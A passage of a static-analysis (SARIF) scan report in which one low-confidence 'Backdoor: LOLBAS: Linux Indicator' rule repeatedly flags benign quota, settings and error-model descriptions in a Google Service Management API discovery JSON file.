                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1959,
                  "startColumn": 638,
                  "endLine": 1959,
                  "endColumn": 647,
                  "snippet": {
                    "text": "ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"producerOverrides\": {\n          \"description\": \"Quota overrides set by the producer. Note that if a consume",
                    "rendered": {
                      "text": "ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"producerOverrides\": {\n          \"description\": \"Quota overrides set by the producer. Note that if a consume",
                      "markdown": "`ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"producerOverrides\": {\n          \"description\": \"Quota overrides set by the producer. Note that if a consume`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1959,
                  "startColumn": 144,
                  "endLine": 1959,
                  "endColumn": 153,
                  "snippet": {
                    "text": " the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n          \"description\": \"Quota overrides set by the consumer. Consumer overrides will only have\\nan effect up to the max_limit specified in the service config, or the\\nthe producer override, if one exists.\\n\\nThe key for this map is one of the following:\\n\\n- '<GROUP_NAME>\\/<LIMIT_NAME>' for quotas defined within quota groups,\\nwhere GROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the ",
                    "rendered": {
                      "text": " the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n          \"description\": \"Quota overrides set by the consumer. Consumer overrides will only have\\nan effect up to the max_limit specified in the service config, or the\\nthe producer override, if one exists.\\n\\nThe key for this map is one of the following:\\n\\n- '<GROUP_NAME>\\/<LIMIT_NAME>' for quotas defined within quota groups,\\nwhere GROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the ",
                      "markdown": "` the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n          \"description\": \"Quota overrides set by the consumer. Consumer overrides will only have\\nan effect up to the max_limit specified in the service config, or the\\nthe producer override, if one exists.\\n\\nThe key for this map is one of the following:\\n\\n- '<GROUP_NAME>\\/<LIMIT_NAME>' for quotas defined within quota groups,\\nwhere GROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1955,
                  "startColumn": 116,
                  "endLine": 1955,
                  "endColumn": 125,
                  "snippet": {
                    "text": "    },\n    \"QuotaSettings\": {\n      \"id\": \"QuotaSettings\",\n      \"description\": \"Per-consumer overrides for quota settings. See google\\/api\\/quota.proto\\nfor the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n",
                    "rendered": {
                      "text": "    },\n    \"QuotaSettings\": {\n      \"id\": \"QuotaSettings\",\n      \"description\": \"Per-consumer overrides for quota settings. See google\\/api\\/quota.proto\\nfor the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n",
                      "markdown": "`    },\n    \"QuotaSettings\": {\n      \"id\": \"QuotaSettings\",\n      \"description\": \"Per-consumer overrides for quota settings. See google\\/api\\/quota.proto\\nfor the corresponding service configuration which provides the default\\nvalues.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"consumerOverrides\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1943,
                  "startColumn": 16,
                  "endLine": 1943,
                  "endColumn": 25,
                  "snippet": {
                    "text": "          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n",
                    "rendered": {
                      "text": "          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n",
                      "markdown": "`          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1942,
                  "startColumn": 16,
                  "endLine": 1942,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n",
                    "rendered": {
                      "text": "        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n",
                      "markdown": "`        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n          ],\n          \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1940,
                  "startColumn": 84,
                  "endLine": 1940,
                  "endColumn": 93,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"consumerEnableStatus\": {\n          \"description\": \"Consumer controlled setting to enable\\/disable use of this service by the\\nconsumer project. The default value of this is controlled by the service\\nconfiguration.\",\n          \"enumDescriptions\": [\n            \"The service is disabled.\",\n            \"The service is enabled.\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1916,
                  "startColumn": 188,
                  "endLine": 1916,
                  "endColumn": 197,
                  "snippet": {
                    "text": "          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n          \"description\": \"Service-defined per-consumer properties.\\n\\nA key-value mapping a string key to a google.protobuf.ListValue proto.\\nValues in the list are typed as defined in the Service configuration's\\nconsumer.properties field.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"array\",\n",
                    "rendered": {
                      "text": "          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n          \"description\": \"Service-defined per-consumer properties.\\n\\nA key-value mapping a string key to a google.protobuf.ListValue proto.\\nValues in the list are typed as defined in the Service configuration's\\nconsumer.properties field.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"array\",\n",
                      "markdown": "`          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n          \"description\": \"Service-defined per-consumer properties.\\n\\nA key-value mapping a string key to a google.protobuf.ListValue proto.\\nValues in the list are typed as defined in the Service configuration's\\nconsumer.properties field.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"array\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1912,
                  "startColumn": 69,
                  "endLine": 1912,
                  "endColumn": 78,
                  "snippet": {
                    "text": "          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n",
                      "markdown": "`          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1908,
                  "startColumn": 72,
                  "endLine": 1908,
                  "endColumn": 81,
                  "snippet": {
                    "text": "          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n",
                      "markdown": "`          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 60,
                  "endLine": 1904,
                  "endColumn": 69,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 1700,
                  "endLine": 1865,
                  "endColumn": 1709,
                  "snippet": {
                    "text": "me error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting purpose.\\n\\n- Batch operations. If a cl",
                    "rendered": {
                      "text": "me error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting purpose.\\n\\n- Batch operations. If a cl",
                      "markdown": "`me error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting purpose.\\n\\n- Batch operations. If a cl`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1834,
                  "startColumn": 88,
                  "endLine": 1834,
                  "endColumn": 97,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The server-assigned name, which is only unique within the same service that\\noriginally returns it. If you use the default HTTP mapping, the\\n`name` should have the format of `operations\\/some\\/unique\\/name`.\",\n          \"type\": \"string\"\n        },\n        \"metadata\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The server-assigned name, which is only unique within the same service that\\noriginally returns it. If you use the default HTTP mapping, the\\n`name` should have the format of `operations\\/some\\/unique\\/name`.\",\n          \"type\": \"string\"\n        },\n        \"metadata\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The server-assigned name, which is only unique within the same service that\\noriginally returns it. If you use the default HTTP mapping, the\\n`name` should have the format of `operations\\/some\\/unique\\/name`.\",\n          \"type\": \"string\"\n        },\n        \"metadata\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1803,
                  "startColumn": 53,
                  "endLine": 1803,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    },\n    \"ProtoSpec\": {\n      \"id\": \"ProtoSpec\",\n      \"description\": \"A collection of protocol buffer service specification files.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"protoDescriptor\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ProtoSpec\": {\n      \"id\": \"ProtoSpec\",\n      \"description\": \"A collection of protocol buffer service specification files.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"protoDescriptor\": {\n",
                      "markdown": "`    },\n    \"ProtoSpec\": {\n      \"id\": \"ProtoSpec\",\n      \"description\": \"A collection of protocol buffer service specification files.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"protoDescriptor\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1714,
                  "startColumn": 191,
                  "endLine": 1714,
                  "endColumn": 200,
                  "snippet": {
                    "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                      "markdown": "`    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1714,
                  "startColumn": 111,
                  "endLine": 1714,
                  "endColumn": 120,
                  "snippet": {
                    "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                      "markdown": "`    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1714,
                  "startColumn": 69,
                  "endLine": 1714,
                  "endColumn": 78,
                  "snippet": {
                    "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n",
                      "markdown": "`    },\n    \"ConfigSource\": {\n      \"id\": \"ConfigSource\",\n      \"description\": \"Represents a user-specified configuration for a service (as opposed to the\\nthe generated service config form provided by `google.api.Service`). This is\\nmeant to encode service config as manipulated directly by customers,\\nrather than the config form resulting from toolchain generation and\\nnormalization.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1566,
                  "startColumn": 528,
                  "endLine": 1566,
                  "endColumn": 537,
                  "snippet": {
                    "text": "ric and the duration the metric applies.\\n\\nEssentially the generated metric is the Area Under Curve(AUC) of\\nthe \\\"duration - resource\\\" usage curve. This AUC metric is readily\\nappliable to billing since \\\"billable resource usage\\\" depends on\\nresource usage and duration of the resource used.\\n\\nA service config may contain multiple resources and corresponding\\nmetrics. AreaUnderCurveParams groups the relevant ones: which\\nsnapshot_metric and change_metric are used to produce which\\ngenerated_metric.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\"",
                    "rendered": {
                      "text": "ric and the duration the metric applies.\\n\\nEssentially the generated metric is the Area Under Curve(AUC) of\\nthe \\\"duration - resource\\\" usage curve. This AUC metric is readily\\nappliable to billing since \\\"billable resource usage\\\" depends on\\nresource usage and duration of the resource used.\\n\\nA service config may contain multiple resources and corresponding\\nmetrics. AreaUnderCurveParams groups the relevant ones: which\\nsnapshot_metric and change_metric are used to produce which\\ngenerated_metric.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\"",
                      "markdown": "`ric and the duration the metric applies.\\n\\nEssentially the generated metric is the Area Under Curve(AUC) of\\nthe \\\"duration - resource\\\" usage curve. This AUC metric is readily\\nappliable to billing since \\\"billable resource usage\\\" depends on\\nresource usage and duration of the resource used.\\n\\nA service config may contain multiple resources and corresponding\\nmetrics. AreaUnderCurveParams groups the relevant ones: which\\nsnapshot_metric and change_metric are used to produce which\\ngenerated_metric.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\"`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1475,
                  "startColumn": 754,
                  "endLine": 1475,
                  "endColumn": 760,
                  "snippet": {
                    "text": "    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar includes the dimensionless unit `",
                    "rendered": {
